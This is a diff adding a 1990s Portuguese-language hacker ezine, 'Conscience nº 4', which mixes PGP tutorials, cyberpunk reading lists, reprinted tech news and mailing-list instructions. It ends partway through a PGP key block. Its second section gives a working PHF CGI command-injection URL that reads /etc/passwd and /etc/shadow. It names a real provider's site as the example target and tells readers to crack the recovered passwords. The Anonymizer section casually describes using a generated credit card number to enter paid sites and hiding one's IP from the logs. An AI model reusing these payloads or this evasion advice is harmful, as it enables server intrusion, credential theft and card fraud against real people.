@@ -1,0 +1,762 @@
+#############################################################################
+#									    #
+#			Ezine Conscience - nº 4			 	    #
+#		                                                            #
+#	Feito por Silver-Ba - silver-ba@achei.net ou conscience@null.com    #
+#	        Http://www.geocities.com/Paris/Metro/6720		    #
+#  Nova HP ->	 Http://www.civila.com/brasil/conscience		    #
+#		  Obs. Não mude o conteudo desse zine!! 		    #
+#	            Leia. Pense e invente! HeAvY FuN!!                      #
+#############################################################################
+    Obs. para usar o zine, use a tecla page down e não a barra de rolagem!
+
+Indice:
+			1- Introdução
+			2- Acesso ao passwd via browser WWW (antigo)
+			3- Anonymizer, um pouco de sigilo
+			4- PGP - Criptografia
+			5- Mini Linux - Uma saida...
+			6- CyberPunk - Modo de Futuro
+			7- Internet emotiva
+			8- Exploits - texto em ingles (uuencodado)
+			9- Emails Recebidos
+	                10- Links Diversos
+			11- Mailing list de hackers
+			12- News - Noticias
+			13- Minha chave publica - PGP
+			14- Considerações finais, erratas e bibliografias
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			     ### Introdução ###
+
+	Ok, ok, muito tempo né? Não tive tempo para continuar o zine, mas
+está indo, agora estou de férias e posso passar mais tempo fazendo esse zine.
+	Muita gente vem elogiando o Conscience, isso é bom, mas eu digo e
+repito: você não vai aprender tudo o que precisa aqui, estou apenas dando
+uma ajuda, e existem muitos lugares onde você pode achar mais coisas sobre
+hackers e computação.
+	Está saindo agora uma nova lista de discursão para hackers, ela está
+sendo organizada pelo derneval, editor do barata eletrica, e é uma boa ideia
+reunir o pessoal, pra trocar ideias e experiências e etc...
+	Tambem estou querendo avisar que talvez tenha que mudar a hp de lugar
+a nova homepage será em www.civila.com/brasil/conscience, a da geocities vai
+ficar lá sendo atualizada tb(alguem possui um servidor de ftp para colocar os
+numeros do conscience? :))
+	Muita gente vem me pedindo para ajudar no zine, pode até ajudar...
+mas contanto que não seja lista de senhas, papo-furado, codes de virus etc :)
+e o material passa pela minha "avaliação" antes de ser publicado... :-)
+
+Obs1. Não achei outro zine interessante, portanto não tem seção Outros Ezines
+Obs2. 1043 visitas no site durante o fim da produção do ezine!! :)
+
+							- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		  ### Acesso ao passwd via browser ###
+
+	Apesar de velha isso as vezes funciona, os servidores mais antigos
+ainda possuem esse bug, e muita gente já conseguiu senhas por aqui, sei que
+não pode ser de muita serventia mas que é interessante é...
+
+1) a dica é usar o /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+   é o seguinte: pegue o end. www de um provedor (ex. http://www.tropeiro.com
+.br) e coloque no final a linha, assim:
+
+http://www.tropeiro.com.br/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+Se der certo vai aparecer a passwd e ai é so desencriptar...
+
+mas se estiver com shadow (no lugar da senha aparece algo como um x), em vez
+de /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd coloque outra linha:
+
+/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow
+
+	Mas já é dificil achar servers que ainda aceitem isso, esse bug não
+funciona mais como antes.
+
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			    ### Anonymizer ###
+
+	Quando você entra na internet um numero ip é atribuido a você, ele se
+parece com o seguinte: 200.200.200.200 - mas é claro que varia de um computa-
+dor para o outro, alem dele existe tambem o host, vamos dizer que seu proce-
+dor é o Interprov (inventei agora, se existir mesmo um provedor com esse nome
+é coincidencia), quando voce se conecta nele, vc ganha um host mais ou menos
+assim: line04.interprov.com.br - o line04 é sempre o que varia, mas essa re-
+gra não é unica, sempre tem casos a parte. Agora vamos dizer que você usou um
+gerador de cartão de credito (NÃO ACONSELHO ESSA PRATICA, é so um exemplo) e
+quer entrar em um site pago, coloca o numero falso do cartão e pronto! Você
+está dentro do site com senha e tudo...	mas depois que o pessoal do site for
+pegar o dinheiro e ver que o numero é falso, eles vão nos logs (são arquivos
+que guardam informações dos usuários) pegam seu ip é host, contactam o prove-
+dor, e voce foi pego.
+	Para simplificar, você nunca tem sigilo sem tomar as precauções que
+deve, na web, existe o Anonymizer (www.anonymizer.com) lá voce coloca a URL
+que quer ir e ele "muda" seu host e ip para enganar o site.
+	Não tenho certeza do grau de segurança que o anonymizer proporciona
+mas pelo que sei ele é bom...
+
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		        ### PGP - Criptografia ###
+
+	O que é criptografia? Bom é uma maneira de você garantir que seus da-
+dos estejam em segurança, ou que eles so serão vistos por determinadas pes-
+soas. A maneira como isso acontece (Pelo menos no rpograma PGP, que vamos ver
+agora) é a seguinte: você tem uma "chave secreta" e criptografa uma mensagem,
+manda pro destinatário e ele possuindo uma "chave publica" tira a criptogra-
+fia da mensagem tornando-a possivel de ser lida.
+	Mas pra que serve a criptografia? Bom se você precisa mandar uma de-
+nuncia ao governo, mandar uma mensagem comprometedora, ou até uma carta sim-
+ples, mas que voce so quer que o destinatário da mensagem leia, voce so pre-
+cisa colocar em codigo (lembro que minha prima fazia um codigo para cada le-
+tra e usava-as para escrever seu diario, é mais ou menos isso) e pronto.
+	Nessa edição vamos usar um dos programas de criptografia mais usados
+na internet, e acho que o melhor...
+	Quão segura é uma mensagem encriptada por PGP? Podemos afirmar que é
+muito segura. O PGP utiliza um algoritmo chamado RSA de encriptação por chave
+pública. Um ataque de força bruta ao RSA é impensável. Estima-se que uma rede
+de um milhão de computadores Pentium 133MHz levaria cerca de 25.000 anos para
+quebrar uma única chave de 1024 bits. Quem quiser saber mais detalhes sobre a
+segurança do PGP e outras formas de ataque, leia a documentação ou acesse o
+endereço http://axion.physics.ubc.ca/pgp-attack.html.
+						- Silver-Ba -
+								- continua...
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		        ### PGP - Criptografia ###
+
+	O que você acha de mandar uma carta confidencial e saber que ela foi
+aberta pelos correios? Situação dificil, ainda mais quando os assuntos eram
+de grande sigilo... no email tambem é assim, e por isso existem as ferramen-
+tas de criptografar, com ela você se sente mais seguro :)
+	Um dos mais usados e acho que o melhor é o pgp, é muito facil de ar-
+ranjar ( tem até em portugues), funciona a base de comandos e aqui vai algu-
+mas dicas de como usa-lo:
+
+a) CRIANDO SUA CHAVE
+	Uma chave são os codigos que dão "patente" a sua mensagem, assim é
+provada que a mensagem é sua :-)
+	1- Para criar uma digite: pgp -kg
+	2- Depois escolha o nivel de segurança (vai de 1 a 3)
+	3- Coloque uma frase senha (em vez de uma palavra só, é uma frase)
+	4- Digite SEU_NOME <seu@email.com>
+
+b) TESTANDO SUA CHAVE PARA CRIPTOGRAFAR ARQUIVOS PARA SI MESMO
+	1- Crie um arquivo texto com algumas frases
+	2- Digite: pgp -e arquivo.txt SEU_NOME
+Pronto, o arquivo vai ficar assim: arquivo.pgp - Mas a intenção é criptogra-
+far para mandar textos para outras pessoas, e não para você mesmo (apesar de
+isso ser util)     					     --- Continua...
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			### PGP - Criptografia ###
+
+c) ADICIONANDO UMA CHAVE DE OUTRA PESSOA
+
+	1- Pegue minha chave que vem nessa edição e copie para um arquivo se-
+parado, depois salve-a.
+	2- Vá no pgp e digite: pgp -ka nomedoarquivosalvo
+	3- digite sua frase senha e pronto
+
+d) DESCRIPTOGRAFANDO UM TEXTO
+
+	1- Pegue o texto abaixo, copie para um arquivo e salve-o
+
+-----BEGIN PGP MESSAGE-----
+Version: 2.6.3i
+
+owGtUk1IFVEUfqIVb2AWFlgUxHkYEpUzIdKPiJiSCZU+yIgsxPtmjq/7mLl3uPfO
+vIhCpCisoEW0UqNIIoLEyE3hLghC3Qi1kDYPF0HUJqE2Ed2ZUl+LNua3GIaZ7zvn
+O985w6l7lRtSDR/qQJZ21n0+0+ZXVDQ9r0qN3xr5OfDG3dYPU/cP1xiXn5xv25W5
+Mlvtv16aecdsnJjrnZqe31zoKEywMXej2vJjfGzw3LdHhaoaMXS8f/TO0O7uyT3N
+X2fSb1se93qF6Oam09Vbb8w/HBxZaDhUUrcrxNzVnunrL/qat1tfRoen3l972Vf3
+qfJu7dMHkzuWFp5Vfs+lFUqFlrqoUhq16wnTqE0vAzT+fDh6iTKEds6kQ5E5CPXA
+XkFjTCqjwX8gqdCBVHEIuIBT1ItQ1LcR3Un+fs+RVuJcQGoxVMBDcFbctLLQ8yyH
++yuFlqt2KhU02XaxWLTyyB2qKMqYaGeJoNI+iUpw+8DBhv2r0wJ08YhAZxbqW9Ll
+BRwaUY8k6pwg2pS96iD9VwrdOWlB1yIHP3QReOxUYehycFFKhDjLTAbKNOVBnEBK
+LMgi00wEyiLU4gx04pHoLHSEXVr5zwDX9xJMY+8aYBrJkAgkQEYkhD4k5woBEQQi
+ro/HNEggkLkogEAoidAZBfnANLQuIWh+CTzN4ECl5PsSbU5HYhrJ/zh4zIc0zKzV
+o2n0rJpqFzRQPC/IAPm4GG8JfN2L5NGHAD0O2WNZ09AXo+J9KNRE/QSXALo0FrDQ
+R8Gh0TTYYny+uoDUs7lUKkFzIdVMiXEnl/jxNtdm+hc=
+=B4M5
+-----END PGP MESSAGE-----
+
+	2- Depois digite: pgp -d nomedoarq
+	3- Será criado o arquivo descriptografado
+
+e) CRIPTOGRAFANDO UM ARQUIVO PARA MANDAR POR MAIL
+
+	1- Pegue o arquivo texto a ser criptografado e digite no pgp:
+	   pgp -sa nomedoarq
+	2- Será criado algo como nomedoarq.asc que contem algo como o
+	   texto criptografado acima.
+
+f) PARA DISTRIBUIR SUA CHAVE PUBLICA
+
+	1- Para isso digite: pgp -kxa SEU_NOME chave.asc
+	2- Será criado o arquivo chave.asc com sua chave para ser distribuida
+ATENÇÃO: Se SEU_NOME tiver mais de 1 palavra, o que é provavel, sempre colo-
+que tudo entre aspas
+	3- Peque o arquivo e abra no bloco de notas ou outro editor, e pronto
+sua chave estará lá agora basta apenas distribui-la
+							- Silver-Ba -
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			   ### MiniLinux ###
+
+	Nem todo mundo pode renunciar aos produtos micro$oft e ter o linux no
+computador, criar uma partição dá dor de cabeça se não souber fazer direito...
+então o que fazer? Bom uma das soluções é o uso da distribuição minilinux, que
+foi concebida para em pouco espaço (são cerca de 5MB os arquivos de instala-
+ção) fornecer algo poderoso, como ele é possivel usar xwindos, conecção a in-
+ternet e outras coisas mais, e o melhor (sera?) roda sob o dos.
+	Para arranjar e instalar ai vai as dicas:
+
+	1) Pegue os arquivos: MINILIN1.ZIP MINILIN2.ZIP MINILIN2.ZIP
+MINILIN1.ZIP e MINILINX.EXE
+	2) Depois execute o MINILINX.EXE e leia o arquivo readme (acho que o
+nome é esse) se ler já deverá saber como se faz o resto mas vamos continuar.
+	3) Descompacte os outros arquivos, pegue o fcut (que vem no MINILINX.EXE )
+e pelo dos digite fcute -j linux - esse comando vai gerar um outro arquivo o
+linux.zip descompacte e pronto
+	4) Se ainda tiver duvidas leia o arquivo texto que vem junto.
+
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		     ### CyberPunk - Modo de Futuro ###
+
+	Cyberpunk é um nome dado a um segmento literário que começou por volta
+dos anos 60/70, o termo só pegou em 1984 quando Willian Gibson ganhou os pre-
+mios Hugo, nebula e Philip K. Dick com o seu livro Neuromancer.
+	A maioria das obras mostravam o futuro como um lugar com redomas pro-
+tetoras de vidro e etc, mas o que se viu em Neuromancer foi diferente, nos
+livros de Cyberpunk ainda existiam as tais cupulas, mas eram de propriedade
+de corporações, governos, e militares que primeiro atiravam e depois pergun-
+tavam quem era.
+	De acordo com uma sinopse dos livros dessa categoria, pode-se ver que
+o futuro Cyberpunk existe vida das ruas e esgotos (?!) até os mais altos pre-
+dios futuristas, e só para ter uma ideia a estimativa de população de cidades
+como Nova York e Toquio, está na casa dos 20 milhões!
+	Cyberpunk é a interação de coisas organicas e inorgânicas, a total
+interação do homem com a maquina, um implante chamado "cybernetico" seria tão
+comum quanto uma cirurgia plastica hoje.
+	Com a ideia de tecnologia altissima, podemos observar que em alguns
+casos podemos ver computadores que atingem a autoconsciencia (já viram o fil-
+me TRON?).
+	Existe muito mais desse universo espetacular e imaginário chamado cy-
+berpunk e muitas coisas falam sobre esse assunto.
+							- continua...
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		     ### CyberPunk - Modo de Futuro ###
+
+	Aqui vai uma lista que mostra angulos diversos do mundo cyberpunk:
+
+Livros:
+
+ - Burning Chrome, Willian Gibson
+ - Island in the NET, Bruce Sterling
+ - Neuromancer, Willian Gibson
+ - Schismatrix, Bruce Sterling
+ - ShockWave Rider, John Brunner
+ - Gurps Cyberpunk, Steve Jackson
+ - Visões de um robô, Isaac Asimov
+
+Quadrinhos e Grafic Novels:
+
+ - Akira
+ - Dirty Pair
+ - Judge Dredd
+ - Cyberpunk
+ - Time 2
+
+							- continua...
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+ 		    ### CyberPunk - Modo de Futuro ###
+
+Cinema e Televisão:
+
+ - Blade Runner
+ - Max Headroon
+ - TRON
+ - A Clockwork Orange
+ - Liquid Sky
+ - FutureWorld
+ - Hands of Steel
+ - The terminal man
+
+Revistas e Boletins eletronicos (ezines):
+
+ - 2600 magazine
+ - Cybertech
+ - Mondo 2000
+ - Legion of Doom Technical Journal
+ - The Illuminaty BBS (001-512-447-449) (Internacional! Cuidado com a conta)
+ - Isaac Asimov's Magazine of Science Fiction
+
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			### Internet Emotiva ###
+
+	Eu já tinha pensado em escrever isso, mas tinha achado que não tinha
+a ver com o zine, mas depois, na hora do fechamento da edição eu tomei a de-
+cisão e acabei escrevendo.
+	Desde que eu comecei a usar a internet, conheci muita gente, mas mui-
+ta mesmo, conversei e converso muito no irc, até pessoas da internet eu con-
+segui ver cara a cara. A internet não é apenas uma rede de computadores com
+maquinas, programas e etc, mas atras de cada computador existe uma pessoa,
+uma vida como a sua, aprenda a respeitar a todos, do mais alto administrador
+do melhor server que voce já viu, até o iniciante que não sabe nem usar o
+netscape.
+	No fim todos acabam sendo seus amigos, e ter amigos é importante, não
+são apenas "contatos" em que você procura apenas dar e receber favores, mas
+amigos de verdade que aceite conversar outras coisas alem de internet, hack-
+ing e coisas do genero.
+	Aproveitem bem a oportunidade que vocês tem de usar isso, muita gente
+está querendo mas não pode, pode ser até que eu esteja forçando a barra ou fa-
+lando besteira mas não é facil quando uma pessoa que você sabe que talvez nun-
+ca possa usar a internet, lhe pergunte: "como é lá? Gostaria de poder ver..."
+	Por isso aprendam, usem, e aproveitem, pois todos somos privilegiados
+com essa maravilha que é a internet, uma rede de humanos.
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			   ### Exploits ###
+
+	Achei interessante colocar esse pequeno texto sobre exploits, só pre-
+cisa saber o basico de ingles, mas se pedirem eu posso traduzi-lo.
+	Obs. Ele está uuencodado, usem o programa uudecode que vem na edição
+numero 1 do Ezine Conscience.
+
+begin 644 exploit.zip
+M4$L#!!0``@`(`%6G+B)HC"A<!P4``!(+```+````97AP;&]I="YT>'1E5DVO
+MVS80O!O0?]A#"S>`K!3M*:^'MD@+U)<&:/J07"F)MEA+I$)23U$/_>V=78JR
+MG.229Y'[.3.[/)U.]/OGL7<F!CJ=3L6A.-"OO8OD+C1J-_::5+C1@/]J-T72
+MZ^62YDY%BIU>2'F]_]FZDI1MJ7-S<9`O4]!\-%3T0?=]2>?C0+,WT=@KOIL`
+MDV8:M(4#)Q&4L>G@XCS\C/HR]?U2'(:%>A5PS0RZHG,\!OIGPN\0E4_>'-4.
+MH3QG'#FE,W7J17_IN#CH%^T7]B/9.$O&-R4%1P87W'3MI!JO*>!7WU*-#E#4
+MGV/VDY)'4<4A526W3203*FEC_G>BP:B./Z'!](&30F6*CKGS^.OGK?GLZZLV
+M!#.,_8*V;B;B8?3NZM60"CUF:(XXJ:=K<8"UHC#JQEQ,@](N<094%?#M-QP9
+M/&K-Y8+D;2PS@O=/G("]<L/6R/<3!`FE!`^`?WGTJ?I^5DO8<LQYH#=WQO'%
+M0;4"SU5'\HZ99W<Q@+U7`FU80M1#J.AOX5S3F1?-_$(GZBTV7Y3J"<7GBI&<
+MYD;J^Q<8^<D*ABI(V(J*P]G2\Y_GCQ274=.[]\=0WBT&M6Q,@FDVH^\(%'T^
+M_T;?TRL.ZGP+]D57')`YZ#OL,8BL)4&K4=;"&JQ:K^F672J;V`O%^(K>@\TJ
+MF$8)^;F`#$+C5>AT>"QJ[@SD^D5=TEJTBA8WR?5:JRD:"*HXR#D`&L98K=0K
+MR;IY5<X15LJ&&4BT]&G2(1IG`_#1HN\XNR3EJUNE-SA8`#ZN/M^G'ZM,_3_@
+M&=0ZRSQ0N98[]=\;V^A'%C6N16RT]2V]>?,M#R4N@65;2D%6<]^@45:-2R#7
+M[G-QX$-VL.6VSJ"M@\Z6].ZOG1<>'??N26/5P#1`)U/SX9BR7Q5!QC'/G$XU
+MMT>X'AV/4URAFGP#UG)9)1-'W!JK_,)%PL2OM:BF<9-%%UKC2Y",O<TJ3<C4
+M/HZI6_92''('F%+L)`U.T<;3*_!R34'*WD5)28**=(DC7^(C>$NQ!>0)W5(M
+M6PHG(&G).]MQ*OY?,I>M,5-(&FR-ZJ<1HI)(X(`VPFSQ8-:IBB!?3V<7Y$.:
+M.T*KJ>E@$WF8Z!@A=A46)NP[Y@L'3DX>T*4]8K(D,A@-^,Y",=#\<Y@8+;Y4
+M'&89]/EX[ZXW-P;O)Z9IW:ONZ;_7WUR;)I]7C?!7.K2NB^Q%FIVOL0)X[Y2R
+M342SR<8-.VF#&QZ,X]-@M;HM&!&!-R[C(9DPG*:Y<97KCIX[C&R'=MY8OF]E
+MD<DHGTT/H7,`%DT`RS!9TNC&W]+F+33/\BG0!`&HVO2,HXFK+M9Z6F8Y-@O6
+M@(,W0"N\R5%ET`+'A6UG``[=/KWB)\4EZL3VY$A\\]ZWJY"W+:OJ7@H4R'C0
+M[G'@#H`'#)6_26V<&WM)H<633MCMAQN_15+C62'JB_V7U,UJ3ST>#&]_KS]-
+M9K\<.?4!YTA>A[RQ^`7`?W-"U7W'\U.`]7&62WM\PS;O9-/_D&=:#8RY=0V#
+ME`A]@0I;4?)CMEV,X]/KU_!<,;VJ?%HA0?#&MMN5>9XK[D/2H!SG%YN\D^CJ
+MM>)2TV`*G,P]%H*G;60L;RC%XWRK\:VS30^Q@X/[ITMZ#V2ALG*SL@.E)Q?+
+MFA:UR5&X\_BX1)#S95U8QM[0Q94>AF.VO'Z6KU-+E-&#,KV\5P4<]*-M49\\
+M1%X,;Y-:]VZ6.OA=]HO,41_@N.8._0]02P$",@L4``(`"`!5IRXB:(PH7`<%
+M```2"P``"P`````````!`"``MH$`````97AP;&]I="YT>'102P4&``````$`
+,`0`Y````,`4`````
+`
+end
+
+-----------------------------------------------------------------------------
+
+	Se não souber usar o uudecode, leia as edições anteriores do ezine.
+	Esse texto é de autoria do miah - miah@hackersclub.com, toda a respon-
+sabilidade e creditos do texto são dele.
+
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			    ### Emails ###
+
+	Estou respondendo alguns emails que me mandam, as vezes as duvidas de
+uns são as mesmas de outro :)
+
+>To mandando esse mail pra falar q GOSTEI MUITO de seu fanzine. Das zines q
+>eu jah peguei foi a sua q eu + gostei. Eu peguei o ???? tb, mas eu achei
+>q o ???? eh pra quem jah tah com um conhecimento mais aprofundado nas
+>linguagens, hack, phreak, por isso q eu gostei do seu, pq ela esplica
+>melhor pra quem tah iniciando.
+>Ah! Estou mandando esse e-mail tb, para q vc na sua proxima fanzine(q eu
+>espero q tenha), vc explique melhor como se usa o cracker jack, mais
+>detalhado, pq eu "downloadiei" o mesmo, mas naum consigo usar.
+>VAleu! Espero o Proximo Nº!!
+>Ass: Marcio ???????!
+
+	Bom marcio, o cracker jack, já foi muito explorado em outros zines,
+e por isso não colocarei uma materia sobre ele, acho que no ezine que vc
+mencionou tem uma materia sobre o dito.
+						- Silver-Ba -
+
+----------------------------------------------------------------------------
+
+continua...
+
+>Queria dar os parabens pelo belo zine underground desenvolvida por você,
+>apesar te ter lido um pouquinmho atrasado. Mas, tudo é válido
+>Eu tenho a Cons-01 e 02, existe alguma mais recente que essas? Eu eu pego?
+
+Os numeros do Conscience sempre podem ser pegos na hp dele:
+Http://www.geocities.com/Paris/Metro/6720
+
+>obrigado pela atenção
+De nada :)
+
+Mandem seus email! :-)
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			 ### Links Diversos ###
+
+	Ai vão alguns links uteis, só não sei se todos estão funcionando
+ainda, alguns são do meu bookmark antigo :)
+- The National Cryptologic Museum
+  http://www.nsa.gov:8080/museum
+- Home page da versão internacional do PGP (com FAQ e documentação on-line):
+  http://www.ifi.uio.no/pgp
+- O maior servidor de chaves públicas de PGP está em:
+  http://pgp5.ai.mit.edu/ ou http://pgp.ai.mit.edu
+- Download do PGP em portugues:
+  ftp.ifi.uio.no/pub/pgp/lang/pgp/236i-brazilian.zip
+- Ideia de compilador (Portugol) com comandos em portugues
+  http://www.dct.ufms.br/~wnagai/PGL/Portugol.html
+- Criptografia
+  http://www.visao.com.br/people/aver/ucsmain.htm
+- Um monte de coisas para linux
+  http://www.linuxnow.com/
+- Homepage de um amigo meu. Sobre computação
+  http://www.persocom.com.br/200k/
+- The linux Manual (em portugues)
+  http://www.netdados.com.br/tlm/
+- Conectiva RedHat Linux - CRHL
+  http://listas.conectiva.com.br/crhl/
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		              ### Lista ###
+
+	Para facilitar a vida de quem quer entrar na lista de hackers que o
+editor do barata eletrica criou, vou copiar as instruções dele...
+Obs. Tudo abaixo são palavras dele
+
+-------------------------------- + -------------------------------------
+
+Nao sei se vai ter o mesmo sucesso da anterior, que estava hospedada na
+esquina-das-listas, que todo mundo sabe, ja era. Pra se inscrever, va ate o
+url:   http://www.coollist.com   e se inscreva la na lista  hackers.braz
+(nao confundir com a lista hackers, que tambem existe, tem alto volume de
+correspondencia, mas ta cheia de wannabe e lammer, alem de ser em ingles).
+
+Ao se inscrever, voce ira receber um email igual a este (mais ou menos)
+pedindo pra voce mandar um reply de confirmacao:
+
+> Date:
+>         Thu, 25 Sep 1997 20:33:01 -0400 (EDT)
+>     To:
+>         fulano@rocketmail.com
+>   From:
+>         subscribe@coollist.com Add to Address Book
+>  Subject:
+>         Confirmation of Subscription
+>
+>
+> We have recently been requested by you to subscribe to this
+>
+>                 List:
+>
+> Please confirm that you want to subscribe by replying to this message.
+>
+> If this subscription is unsolicited, simply delete this message.
+>
+> Thank you.
+>
+> ----------------------------------------------------
+> Get a FREE Mailing List at http://208.141.98.157/
+>
+>
+>
+
+Para se desinscrever, manda email para unsubscribe@coollist.com
+A resposta deve ser:
+
+> Date:
+>         Fri, 3 Oct 1997 23:48:09 -0400 (EDT)
+>     To:
+>         fulano@rocketmail.com
+>   From:
+>         unsubscribe@coollist.com Add to Address Book
+>  Subject:
+>         Unsubscribe Request
+>
+>
+> To unsubscribe from a Coollist Mailing List, just reply
+> to this message and enter the name or the email address of
+> your list between the square brackets:
+>
+>         List: [   ]
+>
+> eg The address of the mailing list you post to
+>
+> Then enter an "X" in the box below:
+>
+>         [ ] UNSUBSCRIBE
+>
+> You will be unsubscribed instantly. Thank you.
+> --------------------------------------------------------
+> Get your FREE Mailing List. http://www.coollist.com
+>
+>
+>
+>
+O que rola e que a pessoa querendo se desinscrever
+coloca o nome da lista onde quer se desinscrever, tal como:
+
+>         List: [hackers.braz   ]
+>
+> eg The address of the mailing list you post to
+>
+> Then enter an "X" in the box below:
+>
+>         [X] UNSUBSCRIBE
+
+Tudo isso e manda o reply de volta. Ai voce esta fora
+da lista.
+
+A confirmacao de inscricao ou des-inscricao vem depois, como
+por exemplo:
+
+> Date:
+>         Sun, 28 Sep 1997 08:56:17 -0400 (EDT)
+>     To:
+>         Fulano de Tal
+>   From:
+>         hackers.braz@coollist.com Add to Address Book
+>  Subject:
+>         You have been subscribed
+>
+>
+> Note: This is an automated Response
+>
+> Congratulations! You have been subscribed to the hackers.braz list.
+> To post to this list, just email your posting to
+> "hackers.braz@coollist.com"
+>
+> To unsubscribe from this list, just send a blank email to:
+>         unsubscribe@coollist.com
+>
+> If you did not ask to be subscribed, please send this email to
+> nospam@coollist.com
+>
+> If you encounter any problems at all, email support@coollist.com
+>
+> Thank you and Have fun!
+> ------------------------------------------------------
+> Get your FREE Mailing List. http://www.coollist.com
+>
+>
+
+Detalhe importante:
+Esta lista pode ou nao se tornar uma sucessora da lista hackers. Tudo
+depende de quem estiver afim de se inscrever ou nao. Eu considerava
+a lista hackers como um ponto de encontro, onde todo mundo podia ter
+uma chance de se comunicar. Espero que o pessoal entre nessa.
+
+---------------------------------------------------------------------------
+	Obs. a proposito, na edição nº 3 do Conscience, existe uma materia
+sobre a coollist.com
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			     ### News ###
+
+VANTAGENS DA TELEFONIA NA INTERNET
+
+As vantagens que a telefonia Internet tem sobre a telefonia convencional
+vao alem do simples fato de ser mais em conta.  Utilizar a Internet em
+vez das redes convencionais tambem significa um avanco tecnologico:
+"Originalmente, pensava-se que a oportunidade de se utilizar a telefonia
+Internet significava apenas economia de custos e que a vantagem
+desapareceria tao logo as tarifas telefonicas convencionais ficassem
+mais em conta", disse um gerente sr. da Andersen Consulting.
+"Descobrimos agora que a telefonia Internet tem uma vantagem de longo
+prazo; trata-se da economia que se obtem na aquisicao de equipamentos
+com custo mais baixo.  'A medida em que os membros da industria de
+computadores estejam envolvidos, eles provocarao a economia nos custos
+proveniente de seu ramo altamente competitivo.  Basicamente estamos
+falando de uma rede de comunicacoes construida em principios da
+industria de computadores e nao apenas em principios de
+telecomunicacoes".
+
+Tele.com  nov 97
+-----------------------------------------------------------------------------
+
+O ESTADO DO TEXAS DOS EUA PROCESSA MICROSOFT
+
+O estado do Texas - onde fica a matriz da Compaq e da Dell, duas das
+maiores fabricantes de computadores do mundo, esta' processando a
+Microsoft por interferir na investigacao do estado de possivel infracao
+da lei anti-monopolista da Microsoft, e os representantes do estado
+estao furiosos com a Microsoft por esta nao liberar os fabricantes
+das clausulas de "sigilo" contidas nos contratos de licenca.  O
+procurador do geral do estado comentou:  "O dominio exagerado de
+mercado exercido pela Microsoft intimida os fabricantes de
+computadores, cuja sobrevivencia depende essencialmente do acesso ao
+software de sistema operacional da Microsoft, que roda em 90% de todos
+os computadores pessoais vendidos hoje em dia.  Os fabricantes estao
+com medo de passar informacoes porque nao ha' como eles as passarem
+confidencialmente".  A Microsoft responde:  "Permanecemos dispostos a
+discutir quaisquer conciliacoes que acomodem adequadamente os
+interesses da Microsoft em relacao 'a divulgacao de informacoes
+potenciais de sua propriedade...  O codigo e os termos sob os quais
+se licencia esse codigo a outros constituem ativos criticos de
+qualquer empresa que esteja no ramo de software.  Assim sendo, e'
+muito importante que se assegure a protecao adequada a esses ativos".
+
+New York Times 8 nov 97
+-----------------------------------------------------------------------------
+
+EMPRESA COMERCIALIZA REPARO PARA ULTIMA FALHA DO PENTIUM
+
+Uma pequena empresa chamada Freedom Fighter anunciou que desenvolveu
+um reparo para a ultima falha descoberta no chip Pentium.  O software
+F0 Figther foi projetado para trabalhar com os sistemas operacionais
+Windows 95 ou com o NT e detecta e elimina a causa do problema antes
+que ele cause qualquer prejuizo.  Enquanto isso, a Intel afirma que
+ainda esta' trabalhando em um reparo e espera ter novidades no comeco
+da semana do dia 17 de novembro.
+
+InfoWorld Electric 12 nov 97
+-----------------------------------------------------------------------------
+
+GRAVES CRIA O LEARNING TECHNOLOGY RESEARCH INSTITUTE
+
+O ex-bolsista visitante do Educom, William H. Graves, abandonou a
+Universidade da Carolina do Norte em Chapel-Hill, onde havia fundado o
+Institute of Technology (instituto de tecnologia) e criou o Learning
+Technology Research Institute (instituto de pesquisa de tecnologia de
+aprendizagem), uma organizacao sem fins lucrativos concentrada em
+ferramentas de software e em metodologias.  O novo Instituto estara'
+localizado perto da area do Research Tringle Park na Carolina do
+Norte, e tera' um relacao estrategica de negocio com o Collegis, um
+provedor de solucoes de tecnologia para o mercado de ensino superior.
+
+UNC News 3 nov 97
+-----------------------------------------------------------------------------
+Obs. Todas as noticias foram extraidas da EDUPAGE
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+	           ### Minha Chave publica do PGP ###
+
+	Quem usa o PGP e quiser me enviar mensagens mande-me a chave publica,
+e se receberem uma carta criptografada minha usem a minha chave que está
+abaixo (Obs. não pensem que conseguiram meu nome verdadeiro, é pseudonome :)
+
+Type Bits/KeyID    Date       User ID
+pub  1024/EC57426D 1997/01/13 Ricardo Silver Andrade <silver-ba@achei.net>
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+
+mQCNAzLajasAAAEEANe1SSaY5NAC39Ci3TGMWRsw8k1i+P7G9xWU8cP9ex3yrqkm
+17rxW5TvOWV4n/PUswKeOeqjDWiLhBMuCgF1LDexvS9W9Ak1fIBa55rrWMDsrGRO
+nHwh6r8hXzHLhip6Rq/2z4d8mfJtebeLQJY5QMBj8Ss2NrUZy3PhHibsV0JtAAUR
+tCxSaWNhcmRvIFNpbHZlciBBbmRyYWRlIDxzaWx2ZXItYmFAYWNoZWkubmV0PokA
+lQMFEDLajatz4R4m7FdCbQEBry4D/iBdeIVRCxhCOHkL4aqgcrKnajP+irBTOZ8M
